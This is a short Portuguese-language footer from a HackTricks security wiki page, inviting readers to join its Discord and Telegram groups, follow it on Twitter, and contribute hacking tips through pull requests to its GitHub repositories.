* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
